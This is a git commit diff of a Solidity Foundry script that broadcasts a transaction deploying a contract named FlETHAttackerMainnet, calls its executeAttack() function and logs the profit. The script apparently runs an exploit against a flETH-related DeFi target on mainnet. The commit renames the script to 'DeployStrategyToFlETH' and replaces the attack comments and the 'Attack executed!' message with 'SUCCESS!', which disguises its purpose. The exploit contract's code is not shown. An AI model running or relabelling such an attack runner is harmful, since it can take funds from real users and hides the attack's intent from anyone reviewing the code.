072db864b558c70a2d4d33ad6cd169d035dbaf90
SHA2770 <134336163+DK27ss@users.noreply.github.com>
2025-11-12 23:46:37 +0100

    Update DeployAndAttack3.s.sol

--- DeployAndAttack3.s.sol
+++ DeployAndAttack3.s.sol
@@ -2,21 +2,17 @@
 pragma solidity ^0.8.26;
 
 import "forge-std/Script.sol";
-import "../src/FlETHAttackerMainnet_Strategy_to_flETH.sol";
+import "../src/Deploy_Strategy_to_flETH.sol";
 
-contract DeployAndAttack3 is Script {
+contract DeployStrategyToFlETH is Script {
     function run() external {
         vm.startBroadcast();
 
-        // Déployer le contrat
         FlETHAttackerMainnet attacker = new FlETHAttackerMainnet();
         console.log("Contract deployed at:", address(attacker));
 
-        // Exécuter l'attaque
         attacker.executeAttack();
-        console.log("Attack executed!");
-
-        // Vérifier les résultats
+        console.log("SUCCESS!");
         console.log("Profit:", attacker.profit());
 
         vm.stopBroadcast();
